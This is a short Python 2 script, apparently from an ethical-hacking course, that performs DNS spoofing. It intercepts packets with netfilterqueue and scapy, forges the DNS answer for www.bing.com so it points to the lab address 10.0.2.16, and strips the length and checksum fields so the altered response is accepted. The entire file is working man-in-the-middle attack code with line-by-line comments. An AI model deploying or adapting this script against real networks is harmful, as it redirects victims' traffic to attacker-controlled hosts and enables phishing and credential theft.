#!/usr/bin/env python
#running on python2
#use ping -c 1 www.bing.com to get the result
import netfilterqueue
import scapy.all as scapy
#
def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    #converts packet into a readable scapy packet
    # scapy.DNSRR gets DNS response
    if scapy_packet.haslayer(scapy.DNSRR):
        qname= scapy_packet[scapy.DNSQR].qname
        #gets the qname field and stores it (query name)
        if "www.bing.com" in qname:
            print("[+]Spoofing target")
            ans=scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
            #change the DNS Response information
            #rrname- sets the response name as the query
            #rdata- sets the data to our own ip
            scapy_packet[scapy.DNS].an=ans
            #sets the packest DNS answer field to our custom answer
            scapy_packet[scapy.DNS].ancount=1
            #sets answer count to 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            #deletes the chksum and len fields from the IP field and UDP field
            #len and chksum are there to make sure that we arent changing the DNS
            #they are fail safe commands for the DNS Server
            packet.set_payload(str(scapy_packet))
            #sets the payload of the returned packet to the string of our custom scapy packet
    packet.accept()
queue=netfilterqueue.NetfilterQueue()
#creates an instance of the netfilter onject
queue.bind(0, process_packet )
#connected the queue to the queue we previously created
queue.run()
#runs the queue that we created
